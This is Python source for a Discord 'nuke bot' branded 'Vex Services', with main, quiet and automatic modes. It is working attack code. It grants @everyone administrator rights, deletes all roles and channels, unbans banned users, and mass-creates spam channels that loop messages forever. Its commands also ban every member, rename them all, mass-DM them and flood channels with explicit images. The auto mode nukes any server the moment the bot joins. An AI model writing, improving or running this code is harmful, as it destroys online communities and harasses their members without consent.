# Main Tags of important packages and other.
import discord, asyncio, json, time, sys, aiohttp, requests, random, os
from discord.ext import commands
from discord import Permissions
from colorama import Fore, Style
from pystyle import Colors, Colorate, Center, Write, Box
from threading import Thread
from io import BytesIO


# Open Data in Config file
with open('util/config.json') as config_file: 
    data = json.load(config_file)

# Data of Nuke Bot Commands.
Token = data['Token']
SpamMessage = data['SpamMessage']
RoleSpamName = data['RoleSpamName']
RoleSpamAmount = data['RoleSpamAmount']
ChannelAmount = data['ChannelAmount']
MessageAllSpeed = data['MessageAllSpeed']
ChannelName = data['ChannelName']
ImageSpam = data['ImageSpam']
ActivityStatus = data['ActivityStatus']
EmojiName = data['EmojiName']
EmojiSpamAmount = data['EmojiSpamAmount']


def main():
    setTitle(f"Vex Services")
    clear()
    global threads
    global cancel_key
    if getTheme() == "Themes":
        banner()

    elif getTheme() == "Neon":
        banner("Neon")

    elif getTheme() == "Jungle":
        banner("Jungle")

    elif getTheme() == "Sky":
        banner("Sky")

    elif getTheme() == "Old":
        banner("Old")

    elif getTheme() == "Lava":
        banner("Lava")

    elif getTheme() == "Ukraine":
        banner("Ukraine")

    elif getTheme() == "America":
        banner("America")

    elif getTheme() == "Bloody":
        banner("Bloody")


# Channel / Message Spam.
SPAM_CHANNEL = [ChannelName]
SPAM_MESSAGE = [SpamMessage]

# Intents for discord Perms.
intents = discord.Intents(messages=True, guilds=True, members=True)

# Bot Prefix
client = commands.Bot(command_prefix='$', intents=intents)

# Clears os System.
clear = lambda: os.system ('cls')

# ASCII Text / System
def menu(): 
    print (Center.XCenter (Colorate.Vertical(Colors.white_to_blue, f'''
               ██╗░░░██╗███████╗██╗░░██╗  ░██████╗███████╗██████╗░██╗░░░██╗██╗░█████╗░███████╗░██████╗
               ██║░░░██║██╔════╝╚██╗██╔╝  ██╔════╝██╔════╝██╔══██╗██║░░░██║██║██╔══██╗██╔════╝██╔════╝
               ╚██╗░██╔╝█████╗░░░╚███╔╝░  ╚█████╗░█████╗░░██████╔╝╚██╗░██╔╝██║██║░░╚═╝█████╗░░╚█████╗░
               ░╚████╔╝░██╔══╝░░░██╔██╗░  ░╚═══██╗██╔══╝░░██╔══██╗░╚████╔╝░██║██║░░██╗██╔══╝░░░╚═══██╗
               ░░╚██╔╝░░███████╗██╔╝╚██╗  ██████╔╝███████╗██║░░██║░░╚██╔╝░░██║╚█████╔╝███████╗██████╔╝
               ░░░╚═╝░░░╚══════╝╚═╝░░╚═╝  ╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚══════╝╚═════╝░
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────               
                    Version 2.0        ╔══════════════════════════════════╗
                                       ║                                  ║
                                              [1] Main Mode
                                              [2] Quiet Mode
                                              [3] Auto Mode (Under Construction)
                                              [4] Themes (Coming Soon)
                                       ║                                  ║
                                       ╚══════════════════════════════════╝
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                    ''', 1)))

menu()
option = int(input(Center.XCenter(Colorate.Horizontal(Colors.black_to_blue, f'''

     Option: ''', 1))))

while option != 0:
    if option == 1:
        clear()
        @client.event
        async def on_ready():
            print(Colorate.Vertical(Colors.blue_to_red, f'''
                       ███╗   ███╗ █████╗ ██╗███╗   ██╗    ███╗   ███╗ ██████╗ ██████╗ ███████╗
                       ████╗ ████║██╔══██╗██║████╗  ██║    ████╗ ████║██╔═══██╗██╔══██╗██╔════╝
                       ██╔████╔██║███████║██║██╔██╗ ██║    ██╔████╔██║██║   ██║██║  ██║█████╗  
                       ██║╚██╔╝██║██╔══██║██║██║╚██╗██║    ██║╚██╔╝██║██║   ██║██║  ██║██╔══╝  
                       ██║ ╚═╝ ██║██║  ██║██║██║ ╚████║    ██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
                       ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝    ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
                                ╔══════════════════════════════════════════════════╗
                                ║                                                  ║
                                            Bot Logged in as: {client.user}                                    

                                                    $commands                     

                                              AH SHIT HERE WE GO AGAIN...         
                                ║                                                  ║
                                ╚══════════════════════════════════════════════════╝
            ''', 1))
            
            await client.change_presence(activity=discord.Game(name=ActivityStatus))

            # Start of $nuke.
        @client.command()
        async def nuke(ctx):
            await ctx.message.delete()
            guild = ctx.guild
            try:

                role = discord.utils.get(guild.roles, name = "@everyone")
                await role.edit(permissions = Permissions.all())
                print(Fore.BLUE + "Everyone has succesfully recieved Admin." + Fore.RESET)
            except:

                print(Fore.WHITE + "Unable to give @everyone Admin." + Fore.RESET)
            for role in guild.roles:
                try:

            # Role (name) deleted.
                    await role.delete()
                    print(Fore.BLUE + f"{role.name} has succesfully been deleted." + Fore.RESET)
                except:

                    print(Fore.WHITE + f"{role.name} COULDN'T get deleted." + Fore.RESET)
            for channel in guild.channels:
              try:

            # Channel (name) deleted.
                await channel.delete()
                print(Fore.BLUE + f"{channel.name} was succesfully deleted." + Fore.RESET)
              except:

               print(Fore.WHITE + f"{channel.name} WAN'T deleted." + Fore.RESET)
            banned_users = await guild.bans()
            for ban_entry in banned_users:
              user = ban_entry.user
              try:
                
            # Ban (user).
                await user.unban("StanTheMan")
                print(Fore.BLUE + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
              except:

                print(Fore.WHITE + f"{user.name}#{user.discriminator} WASN'T unbanned." + Fore.RESET)
            await guild.create_text_channel("StanTheMan lol")
            for channel in guild.text_channels:

            # New Invite Link : 
                link = await channel.create_invite(max_age = 0, max_uses = 0)
                print(f"New Invite Link: {link}")
                
            # Amount of Channels Created | config.json
            for i in range(int(ChannelAmount)):
               await guild.create_text_channel(random.choice(SPAM_CHANNEL))
            print(f"Nuked {guild.name} Successfully W.")
            return

            


            # START OF QUIET MODE 2.
        @client.command()
        async def quietnuke(ctx):
            await ctx.reply('Check Your CMD Or Whatever your Using to Execute.')
            ID = Write.Input("Enter Server ID: ", Colors.blue_to_white, interval=0.06)
            guild = client.get_guild(int(ID))
            try:

                role = discord.utils.get(guild.roles, name = "@everyone L")
                await role.edit(permissions = Permissions.all())
                print(Fore.BLUE + "Everyone has succesfully recieved Admin." + Fore.RESET)
            except:

                print(Fore.WHITE + "Unable to give @everyone Admin." + Fore.RESET)
            for role in guild.roles:
                try:

                    await role.delete()
                    print(Fore.BLUE + f"{role.name} has succesfully been deleted." + Fore.RESET)
                except:

                    print(Fore.WHITE + f"{role.name} COULDN'T get deleted." + Fore.RESET)
            for channel in guild.channels:
              try:

                await channel.delete()
                print(Fore.BLUE + f"{channel.name} was succesfully deleted." + Fore.RESET)
              except:

                print(Fore.WHITE + f"{channel.name} WASN'T deleted." + Fore.RESET)
            banned_users = await guild.bans()
            for ban_entry in banned_users:
              user = ban_entry.user
              try:

                await user.unban("StanTheMan")
                print(Fore.BLUE + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
              except:

                print(Fore.WHITE + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
            await guild.create_text_channel("StanTheMan")
            for channel in guild.text_channels:

        # New Invite Link.
                link = await channel.create_invite(max_age = 0, max_uses = 0)
                print(f"New Invite: {link}")

        # Amount of channels spammed.
            for i in range(int(ChannelAmount)):
               await guild.create_text_channel(random.choice(SPAM_CHANNEL))
            print(f"Nuked {guild.name} Successfully.")
            return

        # Ban @everyone.
        @client.command(pass_context=True)
        async def banall(ctx):
            guild = ctx.guild
            await ctx.message.delete()
            for member in guild.members:
                try:

                    await member.ban()
                    print(Fore.BLUE + f"{member.name}#{member.discriminator} Was succesfully banned, I hate that guy." + Fore.RESET)
                except:

                    print(Fore.WHITE + f"{member.name}#{member.discriminator} Was unable to get banned, rip." + Fore.RESET)

        # Create Webhook.
        @client.command(pass_context=True)
        async def webhook(ctx):
            channel = ctx.message.channel
            await ctx.message.delete()
            try:
                webhook = await channel.create_webhook(name="Yes")
                print(Fore.BLUE + f"Webhook succesfully Created {webhook.url} " + Fore.RESET)
            except:
                print(Fore.WHITE + f"Unable To Create Webhook" + Fore.RESET)

        # Create VC Channel.
        @client.command()
        async def createvc(ctx, channelName):
            guild = ctx.guild
            mbed = discord.Embed(
                title = 'Success!',
                description = f'{channelName} has successfully been created!'
            )
            if ctx.author.guild_permissions.manage_channels:
                await guild.create_voice_channel(name=channelName)
                await ctx.send(embed=mbed)
                
        # Delete VC Channel.
        @client.command()
        async def deletevc(ctx, vc: discord.VoiceChannel):
            mbed = discord.Embed(
                title = 'Success!',
                description = f"{vc} has successfully been deleted!"
            )
            if ctx.author.guild_permissions.manage_channels:
                await ctx.send(embed=mbed)
                await vc.delete()


        # Renames @everyone username to typed message.
        @client.command(pass_context=True)
        async def renameall(ctx, *, rename_to):
            guild = ctx.guild
            await ctx.message.delete()
        
            for member in guild.members:
                try:
                    await member.edit(nick=rename_to)
                    print (Fore.BLUE + f"{member.name} has succesfully been renamed to {rename_to}" + Fore.RESET)
                except:
                    print (Fore.WHITE + f"{member.name} HASN'T been renamed" + Fore.RESET)

        # DM's @everyone typed message.
        @client.command(pass_context=True)
        async def messageall(ctx, *, messagename):
            await ctx.message.delete()
            for member in list(client.get_all_members()):
                await asyncio.sleep(0)
                try:
                    await asyncio.sleep(int(MessageAllSpeed))
                    await member.send(messagename)
                except:
                    pass
                print(Fore.BLUE + f"DMed {member} *{messagename}*" + Fore.RESET)

        # Admin @everyone.
        @client.command(pass_context=True)
        async def adminall(ctx):
            await ctx.message.delete()
            guild = ctx.guild
            try:
                role = discord.utils.get(guild.roles, name = "@everyone")
                await role.edit(permissions = Permissions.all())
                print(Fore.BLUE + "Everyone has succesfully recieved Admin." + Fore.RESET)
            except:
                print(Fore.WHITE + "Unable to give @everyone Admin." + Fore.RESET)

        # Image spam | config.json.
        @client.command(pass_context=True)
        async def imagespam(ctx):
            await ctx.message.delete()
            guild = ctx.guild
            for i in range(int(ImageSpam)):
                for channel in guild.channels:
                    try:
                        async with aiohttp.ClientSession() as cs:
                            async with cs.get(f'https://nekobot.xyz/api/image?type=hentai') as r:

                                data = await r.json()
                                embed = discord.Embed(title="STANTHEMAN LOL", color=0)
                                embed.set_image(url=data['message here'])

                                await channel.send(embed=embed)
                    except:
                        print(Fore.WHITE + f"Unable to send image in {channel.name}" + Fore.RESET)

        # This deletes message #
        @client.command()
        async def clear(ctx,amount=1):
            await ctx.channel.purge(limit=amount+1)
            print(Fore.BLUE + f'Successffully deleted message #.' + Fore.RESET)


        # Stops Nuke or other cmds
        @client.command()
        async def stop(ctx):
            await ctx.message.delete()
            await asyncio.sleep(0.5)
            await ctx.bot.logout()
            print (Fore.BLUE + f"{client.user.name} has logged out successfully." + Fore.RESET)





        @client.command()
        async def emojispam(ctx):
            await ctx.message.delete()
            guild = ctx.guild
            for i in range(int(EmojiSpamAmount)):
                try:
                    with open("emoji.jpg", "rb") as emoji:
                        image = emoji.read()
                    await ctx.guild.create_custom_emoji(name=EmojiName, image=image, roles=None, reason=None)
                    print(Fore.GREEN + "Created emoji!" + Fore.RESET)
                except:
                    print(Fore.MAGENTA + "Could not create emoji!" + Fore.RESET)

        # Shows command list of all this bot does.
        @client.command()
        async def commands(ctx):
            await ctx.message.delete()
            try:

                await ctx.author.send('''
**HARMFUL COMMANDS**
$nuke           (rapes the whole server | config.json)
$quietnuke      (this nukes the server quietly.)
$webhook        (this creates a webhook with a name that you type.)
$banall         (this bans @everyone.)
$renameall      (this renames @everyone username.)
$messageall     (this dms @everyone a certain message you type.)
$adminall       (gives @everyone Admin.)
$imagespam      (spams a certain image link.)

**NON HARMFUL COMMANDS**
$commands      (this dms you this list.)
$clear          (this clears message after you type how many u want to clear.
$createvc       (creates vc you name.)
$stop           (stops nuke or other cmds.)
''')
                print(Fore.BLUE + "You have been dmed all the commands for the bot." + Fore.RESET)
            except:
                print(Fore.BLUE + "Unable to DM bot commands." + Fore.RESET)

        @client.event
        async def on_guild_channel_create(channel):
          while True:
              
            await channel.send(random.choice(SPAM_MESSAGE))

        client.run(Token, bot=True)

    elif option == 2:
        clear()
        @client.event
        async def on_ready():
            print(Colorate.Vertical(Colors.blue_to_red,  f'''
                        ██████╗ ██╗   ██╗██╗███████╗████████╗    ███╗   ███╗ ██████╗ ██████╗ ███████╗
                       ██╔═══██╗██║   ██║██║██╔════╝╚══██╔══╝    ████╗ ████║██╔═══██╗██╔══██╗██╔════╝
                       ██║   ██║██║   ██║██║█████╗     ██║       ██╔████╔██║██║   ██║██║  ██║█████╗  
                       ██║▄▄ ██║██║   ██║██║██╔══╝     ██║       ██║╚██╔╝██║██║   ██║██║  ██║██╔══╝  
                       ╚██████╔╝╚██████╔╝██║███████╗   ██║       ██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
                        ╚══▀▀═╝  ╚═════╝ ╚═╝╚══════╝   ╚═╝       ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
                                                                              
                                        ╔════════════════════════════════════════╗
                                        ║                                        ║
                                             Bot Logged in as: {client.user}

                                                     goin in sneaky...
                                        ║                                        ║
                                        ╚════════════════════════════════════════╝
            ''', 1))

            # START OF Quiet Mode 2.
            # Enter Server ID for Quiet Mode.
            await client.change_presence(activity=discord.Game(name=ActivityStatus))
            ID = Write.Input("Enter Server ID: ", Colors.red_to_yellow, interval=0.06)
            guild = client.get_guild(int(ID))
            try:

                # @everyone can or cant get Admin.
                role = discord.utils.get(guild.roles, name = "@everyone")
                await role.edit(permissions = Permissions.all())
                print(Fore.BLUE + "@everyone has succesfully recieved Admin." + Fore.RESET)
            except:

                print(Fore.WHITE + "Unable to give @everyone Admin." + Fore.RESET)
            for role in guild.roles:
                try:

                # Role name has been deleted or cant get deleted.
                    await role.delete()
                    print(Fore.BLUE + f"{role.name} has succesfully deleted." + Fore.RESET)
                except:

                    print(Fore.WHITE + f"{role.name} COULDN'T be deleted." + Fore.RESET)
            for channel in guild.channels:
              try:

                # Channel name has been deleted or cant get deleted.
                await channel.delete()
                print(Fore.BLUE + f"{channel.name} was succesfully deleted." + Fore.RESET)
              except:

                print(Fore.WHITE + f"{channel.name} WASN'T deleted." + Fore.RESET)
            banned_users = await guild.bans()
            for ban_entry in banned_users:
              user = ban_entry.user
              try:

                # Username got banned or is unnable to get banned.
                await user.unban("StanTheMan")
                print(Fore.BLUE + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
              except:

                print(Fore.WHITE + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
            await guild.create_text_channel("STANTHEMAN")
            for channel in guild.text_channels:
                # Creates new  Invite Link.
                link = await channel.create_invite(max_age = 0, max_uses = 0)
                print(f"New Invite: {link}")

                # Amount of channels to be created in data inside config.json file.
            for i in range(int(ChannelAmount)):
               await guild.create_text_channel(random.choice(SPAM_CHANNEL))
            print(f"Nuked {guild.name} Successfully.")
            return


        @client.event
        async def on_guild_channel_create(channel):
          while True:
            await channel.send(random.choice(SPAM_MESSAGE))


## OPTION 3 FOR NUKE BOT OPTIONS
    elif option == 3:
        clear()
        @client.event
        async def on_ready():
            print(Colorate.Vertical(Colors.blue_to_white,  f'''

         █████╗ ██╗   ██╗████████╗ ██████╗     ███╗   ███╗ ██████╗ ██████╗ ███████╗
        ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗    ████╗ ████║██╔═══██╗██╔══██╗██╔════╝
        ███████║██║   ██║   ██║   ██║   ██║    ██╔████╔██║██║   ██║██║  ██║█████╗  
        ██╔══██║██║   ██║   ██║   ██║   ██║    ██║╚██╔╝██║██║   ██║██║  ██║██╔══╝  
        ██║  ██║╚██████╔╝   ██║   ╚██████╔╝    ██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
        ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝     ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
                                                                           
                        ╔════════════════════════════════════════╗
                        ║                                        ║
                              Bot Logged in as: {client.user}

                                 Automatic like a tec-9...
                        ║                                        ║
                        ╚════════════════════════════════════════╝

            ''' + Fore.RESET))
## ACTIVITY STATUS
            await client.change_presence(activity=discord.Game(name=ActivityStatus))

## ON SERVER JOIN = AUTOMATIC NUKE
        @client.event
        async def on_guild_join(guild):
            try:

## @everyine HAS SUCCESSFULY RECIEVED ADMIN MESSAGE
                role = discord.utils.get(guild.roles, name = "@everyone")
                await role.edit(permissions = Permissions.all())
                print(Fore.GREEN + "@everyone has successfully recieved Admin." + Fore.RESET)
            except:

## COULDN'T GIVE @everyone Admin OR WAS UNABLE TO GIVE
                print(Fore.WHITE + "Was unable to give @everyone Admin." + Fore.RESET)
            for role in guild.roles:
                try:

## ROLE/NAME WAS SUCCESSFULLY DELETED
                    await role.delete()
                    print(Fore.BLUE + f"{role.name} has been successfully deleted." + Fore.RESET)
                except:

## ROLE/NAME COULDN'T BE DELETED or WASN'T SUCCESSFULLY DELETED
                    print(Fore.WHITE + f"{role.name} couldn't be deleted." + Fore.RESET)
            for channel in guild.channels:
              try:

## CHANNEL/NAME WAS SUCCESSFULLY DELETED 
                await channel.delete()
                print(Fore.BLUE + f"{channel.name} was successfully deleted." + Fore.RESET)
              except:

## CHANNEL/NAME WASN'T deleted or COULDN'T BE DELETED
                print(Fore.BLUE + f"{channel.name} COULDN'T be deleted." + Fore.RESET)
            banned_users = await guild.bans()
            for ban_entry in banned_users:
              user = ban_entry.user
              try:

## USE WAS SUCCESSFULLY UNBANNED MESSAGE In Guild
                await user.unban("StanTheMan000")
                print(Fore.WHITE + f"{user.name}#{user.discriminator} was successfully unbanned." + Fore.RESET)
              except:

## USER WASN'T UNBANNED MESSAGE In Guild
                print(Fore.BLUE + f"{user.name}#{user.discriminator} WASN'T unbanned." + Fore.RESET)
            await guild.create_text_channel("StanTheMan000")
            for channel in guild.text_channels:

## New Invite Link into OS SYSTEM
                link = await channel.create_invite(max_age = 0, max_uses = 0)
                print(f"New Invite Link: {link}")

## SERVER NUKED SUCCESSFULLY MESSAGE
            for i in range(int(ChannelAmount)):
               await guild.create_text_channel(random.choice(ChannelName))
            print(f"Server Nuked: {guild.name} Successfully.")
            return

## SPAM MESSAGE / ON GUILD
        @client.event
        async def on_guild_channel_create(channel):
          while True:
            await channel.send(random.choice(SPAM_MESSAGE))

## RUNS BOT TOKEN / CHECKS IF BOT TOKEN IS TRUE / NOT INVALID
        client.run(Token, bot=True)
    else:
        print("Option was INVALID")
## END OF CODE HERE.